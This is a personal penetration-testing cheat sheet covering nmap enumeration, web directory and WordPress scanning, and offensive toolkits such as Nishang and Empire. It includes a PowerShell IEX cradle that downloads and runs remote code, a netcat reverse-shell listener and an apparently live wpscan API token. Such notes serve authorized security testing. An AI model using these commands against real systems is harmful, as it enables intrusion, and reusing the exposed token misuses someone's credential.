# Pen Test notes

## Initial Enum

- This is a script that i made that does nmap enumeration, just run it with sudo and type in an IP
```
#/bin/bash
read -p "Enter an IP here: " USER_IP
OPEN_PORTS=`nmap -p- --min-rate=1000 -T4 $USER_IP | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//`
nmap -p$OPEN_PORTS -sC -sV $USER_IP

```
- nmap scripts stored in ```/usr/share/nmap/scripts```
- search internal exploit db using ```searchsploit <SEARCHTERM>```
- mirror exploit to current directory using ```searchsploit -m <EXPLOIT_ID>```
 
## Web
- its always safe to run a ```dirb <URL>``` to get an idea of publicly accesible URLs
  - While youre doing this since davtest doesnt support proxy you gotta edit some settings in burp id you want to view the traffic.
    - go to Options >Proxy Listeners
    - In the Bindings tab change the port to 80, and the interfact to your localhost
    - IN the Request Handling, change IP and Port to that of your target
    - Finally redo the davtest on your localhost specified in the binding tab
- another suitable alernative for dirbuster is gobuster you have to make sure to specify wordlists.
  - ```
    gobuster /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <URL> -t 20
    ```
- Nikto can be used with ```nikto -host <URL>```
- if you wee webdav open, try to ```davtest -url <URL>``` 
- Wordpress sites can be scanned with 
  ```
  wpscan --url <URL> --enumerate --api-token OLQ6ae0X6oaP5TolckVONjsTzsmh5Nz3sVNbj0JCuIY
  ```


# Exploitation
- Python PTY Shells
  ```
  git clone https://github.com/infodox/python-pty-shells.git
  ```
- Nishang Pentest Tools
  ```
  git clone https://github.com/samratashok/nishang.git
  ```
- Powershell Empire
  ```
  git clone https://github.com/EmpireProject/Empire.git
  ```
- When trying blind remote code execution on a box the easiest way to tell if it work is by pinging yourself so on yout local box set up a pcap```tcmpdump -i <INTERFACE_NAME>```
- Remember when you FTP data, if you want to send any special media like executables specify ```binary```


## Windows
- When on target powershell enumeration can be done by using the sherlock script
  ```
  git clone https://github.com/rasta-mouse/Sherlock.git
  ```
- When using shells found in the Nishang kit make sure your handler is ```nc -lvnp <Port>```
- 64Bt binaries in windows are stored in ```C:\Windows\SysNative```
- Powershell is stored in ```C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe```
- wget and execute with powershell using INVOKE-EXPRESSION ```IEX(New-Object Net.Webclient).downloadString('<URL>')```

## File Transfer
- https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
